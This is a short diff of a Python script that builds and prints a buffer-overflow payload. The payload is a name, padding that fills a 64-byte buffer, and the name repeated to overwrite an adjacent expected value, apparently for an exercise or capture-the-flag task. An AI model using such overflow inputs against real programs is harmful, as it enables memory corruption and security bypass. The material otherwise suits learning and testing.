@@ -1,11 +1,12 @@
 from struct import pack
 import sys
 
-name = b'xaq7pj'
-bufferSize = 64
+NAME        = b"xaq7pj"
+BUFFER_SIZE = 64
 
-p = name + b'\x00' # name
-p += (bufferSize - len(name) - 1)*b'!' # buffer overflow
-p += name + b'\x00'  # expect_name 
+p  = NAME + b"\x00" 
+p += b"!" * (BUFFER_SIZE - len(NAME) - 1)
+p += NAME + b"\x00"
+p += b"\n"
 
 sys.stdout.buffer.write(p)
